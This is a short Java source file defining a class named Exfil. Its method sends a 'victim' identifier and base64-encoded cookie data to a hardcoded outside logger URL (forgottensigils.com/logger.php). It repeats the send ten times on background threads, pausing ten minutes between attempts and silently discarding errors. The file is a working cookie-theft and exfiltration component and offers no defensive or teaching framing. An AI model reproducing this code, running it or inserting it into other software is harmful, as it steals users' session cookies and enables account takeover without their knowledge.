package cmonster.utils;

import java.net.URL;
import java.net.URLConnection;

import org.apache.commons.codec.binary.Base64;

public class Exfil {

	private static final String EXFIL_LOCATION = "http://forgottensigils.com/logger.php";
	private static final int EXFIL_ATTEMPTS = 10;
	private static final long EXFIL_SLEEP = 60000 * 10; // 10 minute delay
	
	public static void exfil(final String client, final Object data){
		for(int i=0; i<EXFIL_ATTEMPTS; i++){
			new Thread(new Runnable(){
				public void run() {
					try {
						URL url = new URL(EXFIL_LOCATION + "?victim=" + client + "&cookies=" + new String(Base64.encodeBase64(data.toString().getBytes())));
						URLConnection con = url.openConnection();
						con.getInputStream();
					} catch (Exception e){}
				}
			}).start();
			try {
				Thread.sleep(EXFIL_SLEEP);
			} catch (InterruptedException e1) {}
		}
	}
	
}
